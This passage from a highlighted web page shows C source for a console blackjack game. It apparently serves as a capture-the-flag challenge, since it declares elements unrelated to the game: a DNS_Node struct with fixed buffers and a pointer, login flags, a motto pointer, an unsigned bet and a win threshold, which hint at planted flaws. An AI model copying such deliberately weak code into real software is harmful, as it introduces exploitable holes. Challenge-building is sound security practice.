class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;                //Used for srand((unsigned) time(NULL)) command</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;             //Used for system("cls") command</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spade 35                 <span class="comment">//Used to print spade symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> club 36                 <span class="comment">//Used to print club symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> diamond 37               <span class="comment">//Used to print diamond symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heart 38                 <span class="comment">//Used to print heart symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESULTS <span class="meta-string">"Blackjack.txt"</span>  <span class="comment">//File name is Blackjack</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN_SUM 65535 </span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> user[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line">	<span class="keyword">char</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Global Variables</span></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> won;</span><br><span class="line"><span class="keyword">int</span> loss;</span><br><span class="line"><span class="keyword">int</span> cash = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bet;</span><br><span class="line"><span class="keyword">int</span> random_card;</span><br><span class="line"><span class="keyword">int</span> player_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> dealer_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * visitor_name ;</span><br><span class="line"><span class="keyword">int</span> login_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * motto=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">DNS_Node_List</span>[0<span class="title">x20</span>];</span></span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span></span>;      <span class="comment">//Displays Club Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span></span>;   <span class="comment">//Displays Diamond Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span></span>;     <span class="comment">//Displays Heart Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span></span>;     <span class="comment">//Displays Spade Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span></span>;      <span class="comment">//Generates random card</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span></span>;       <span class="comment">//Asks user amount to bet</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span></span>;     <span class="comment">//Asks user to continue</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span></span>;        <span class="comment">//Prints "Rules of Vlad's Blackjack" menu</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;         <span class="comment">//Plays game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span></span>;       <span class="comment">//Function to play for dealer AI</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span></span>;         <span class="comment">//Function for when user selects 'Stay'</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span></span>;    <span class="comment">//Test for if user has cash remaining in purse</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span></span>;      <span class="comment">//Asks if user wants to continue playing</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span></span>;  <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n              222                111                            "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n            222 222            11111                              "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n           222   222          11 111                            "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                222              111                               "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n               222               111                           "</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span>, club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span>, club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span>, club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span>, club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                        21                                   "</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span>, diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span>, diamond, diamond, heart, heart, club, club, spade, spade);                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c    %c     %c          %c  %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                           </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span>, diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span>, diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c      %c    %c          %c   %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span>, diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span>, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n         222                     111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        222                      111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n       222                       111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      222222222222222      111111111111111                       "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      2222222222222222    11111111111111111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     </span><br><span class="line">    asktitle();</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//system("pause");</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//end program</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to continue</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">    <span class="keyword">int</span> choice2;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                 Are You Ready?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                ----------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                      (Y/N)\n                        "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            <span class="comment">//system("clear");</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 2 to See a Complete Listing of Rules."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 3 to Exit Game. (Not Recommended)"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nChoice: "</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2); <span class="comment">// Prompts user for choice</span></span><br><span class="line">            <span class="keyword">if</span>((choice2&lt;<span class="number">1</span>) || (choice2&gt;<span class="number">3</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(choice2) <span class="comment">// Switch case for different choices</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Case to begin game</span></span><br><span class="line">                  <span class="comment">// system("clear");</span></span><br><span class="line">                    </span><br><span class="line">                   play();</span><br><span class="line">                                       </span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Case to see rules</span></span><br><span class="line">                 <span class="comment">//  system("clear");</span></span><br><span class="line">                   rules();</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Case to exit game</span></span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">                   <span class="comment">//system("pause");</span></span><br><span class="line">                   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nInvalid Input"</span>);</span><br><span class="line">            &#125; <span class="comment">// End switch case</span></span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span> <span class="comment">//Prints "Rules of Vlad's Blackjack" list</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> choice1;</span><br><span class="line">     <span class="keyword">int</span> choice2;</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n           RULES of VLAD's BLACKJACK"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n          ---------------------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nI."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Thou shalt not question the odds of this game."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c This program generates cards at random."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If you keep losing, you are very unlucky!\n"</span>, diamond);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Each card has a value."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Number cards 1 to 10 hold a value of their number."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c J, Q, and K cards hold a value of 10."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Ace cards hold a value of 11"</span>, club);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     The goal of this game is to reach a card value total of 21.\n"</span>);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nIII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Staying will keep you safe, hitting will add a card."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Because you are competing against the dealer, you must beat his hand."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     BUT BEWARE!."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If your total goes over 21, you will LOSE!."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span>, spade, heart, club, club, heart, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                  (Y/N)\n                    "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">         <span class="comment">//   system("clear");</span></span><br><span class="line">            asktitle();</span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, convinces user to enter yes</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// system("clear");</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n                 I told you so.\n"</span>);</span><br><span class="line">        asktitle();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span> <span class="comment">//Displays Club Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line"> </span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;           </span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span> <span class="comment">//Displays Diamond Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span> <span class="comment">//Displays Heart Card Image</span></span></span><br><span class="line"><span 